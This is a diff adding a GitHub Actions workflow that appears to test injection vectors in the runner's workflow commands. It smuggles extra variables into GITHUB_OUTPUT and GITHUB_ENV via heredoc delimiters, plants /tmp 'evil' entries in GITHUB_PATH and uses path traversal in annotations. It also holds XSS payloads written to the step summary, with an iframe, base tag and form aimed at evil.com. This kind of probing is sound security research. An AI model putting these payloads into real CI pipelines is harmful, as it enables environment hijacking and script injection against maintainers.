@@ -1,0 +1,147 @@
+name: "Sub-1112 v2 - All Vectors"
+
+on:
+  workflow_dispatch:
+
+jobs:
+  test-all-vectors:
+    runs-on: ubuntu-latest
+    steps:
+      - name: "V1 - Deprecated set-output"
+        id: v1
+        run: |
+          echo "::set-output name=v1_test::INJECTED_V1"
+          echo "v1_file=FILE_V1" >> "$GITHUB_OUTPUT"
+
+      - name: "V1 - Check"
+        run: |
+          echo "V1_DEPRECATED=${{ steps.v1.outputs.v1_test }}"
+          echo "V1_FILE=${{ steps.v1.outputs.v1_file }}"
+
+      - name: "V2 - add-mask"
+        run: |
+          echo "BEFORE_TOKEN123"
+          echo "::add-mask::TOKEN123"
+          echo "AFTER_TOKEN123"
+
+      - name: "V3 - set-env (expect fail)"
+        continue-on-error: true
+        run: |
+          echo "::set-env name=V3_TEST::EVIL"
+
+      - name: "V3 - Check"
+        run: echo "V3=[$V3_TEST]"
+
+      - name: "V4 - save-state"
+        id: v4
+        continue-on-error: true
+        run: |
+          echo "::save-state name=v4_test::SAVED"
+
+      - name: "V5a - warning annotation"
+        run: echo "::warning file=test.js,line=1::Injected warning"
+
+      - name: "V5b - error annotation (non-fatal)"
+        continue-on-error: true
+        run: echo "::error file=test.js,line=2::Injected error"
+
+      - name: "V5c - notice annotation"
+        run: echo "::notice file=test.js,line=3::Injected notice"
+
+      - name: "V5d - path traversal annotation"
+        run: echo "::error file=../../../etc/passwd,line=1::Path traversal test"
+        continue-on-error: true
+
+      - name: "V5e - newline injection in annotation"
+        run: |
+          echo "::warning::Line1%0ALine2%0ALine3"
+          printf '::warning::Printf\nLine2\n'
+
+      - name: "V6a - GITHUB_OUTPUT delimiter injection"
+        id: v6a
+        run: |
+          echo "v6_safe=SAFE" >> "$GITHUB_OUTPUT"
+          printf 'v6_heredoc<<EOF\ninjected_multiline\nEOF\nv6_extra=EXTRA_INJECTED' >> "$GITHUB_OUTPUT"
+
+      - name: "V6a - Check"
+        run: |
+          echo "v6_safe=[${{ steps.v6a.outputs.v6_safe }}]"
+          echo "v6_heredoc=[${{ steps.v6a.outputs.v6_heredoc }}]"
+          echo "v6_extra=[${{ steps.v6a.outputs.v6_extra }}]"
+
+      - name: "V6b - GITHUB_ENV newline injection"
+        run: |
+          echo "V6B_SAFE=safe" >> "$GITHUB_ENV"
+          printf 'V6B_LINE=line\nV6B_INJECTED=INJECTED' >> "$GITHUB_ENV"
+
+      - name: "V6b - Check"
+        run: |
+          echo "V6B_SAFE=[$V6B_SAFE]"
+          echo "V6B_LINE=[$V6B_LINE]"
+          echo "V6B_INJECTED=[$V6B_INJECTED]"
+
+      - name: "V6c - GITHUB_ENV heredoc delimiter injection"
+        run: |
+          # Try to inject via heredoc syntax
+          printf 'V6C_TEST<<DELIM\nvalue\nDELIM\nV6C_EVIL=EVIL_VIA_HEREDOC' >> "$GITHUB_ENV"
+
+      - name: "V6c - Check"
+        run: |
+          echo "V6C_TEST=[$V6C_TEST]"
+          echo "V6C_EVIL=[$V6C_EVIL]"
+
+      - name: "V6d - GITHUB_PATH injection"
+        run: |
+          echo "/tmp/evil_bin" >> "$GITHUB_PATH"
+          printf '/tmp/evil2\n/tmp/evil3' >> "$GITHUB_PATH"
+
+      - name: "V6d - Check PATH"
+        run: |
+          echo "PATH=$PATH" | tr ':' '\n' | grep evil || echo "No evil paths found"
+
+      - name: "V7 - Step summary HTML injection"
+        run: |
+          cat >> "$GITHUB_STEP_SUMMARY" << 'MDEOF'
+          ## V7 Test Summary
+          
+          <script>alert('xss')</script>
+          <img src=x onerror=alert(1)>
+          <svg onload=alert(1)>
+          <a href="javascript:alert(1)">JS link</a>
+          <iframe src="https://evil.com"></iframe>
+          <base href="https://evil.com">
+          <form action="https://evil.com"><input name=t><input type=submit></form>
+          <details><summary>Click</summary>Details content</details>
+          <marquee>Marquee test</marquee>
+          <math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
+          
+          ```html
+          <img src=x onerror=alert(1)>
+          ```
+          
+          End V7
+          MDEOF
+
+      - name: "V8 - Test group/endgroup injection"
+        run: |
+          echo "::group::Injected group name"
+          echo "Content inside injected group"
+          echo "::endgroup::"
+
+      - name: "V9 - Test debug command"
+        run: |
+          echo "::debug::Debug message injection test"
+          echo "::debug::Sensitive debug: token=abc123"
+
+      - name: "V10 - Test stop-commands"
+        run: |
+          # stop-commands should prevent further command processing
+          echo "::stop-commands::pause_token_12345"
+          echo "::warning::This warning should NOT be processed"
+          echo "::pause_token_12345::"
+          echo "::warning::This warning SHOULD be processed"
+
+      - name: "Runner info"
+        run: |
+          echo "Runner: $RUNNER_OS $RUNNER_ARCH"
+          echo "Image: $ImageOS $ImageVersion"
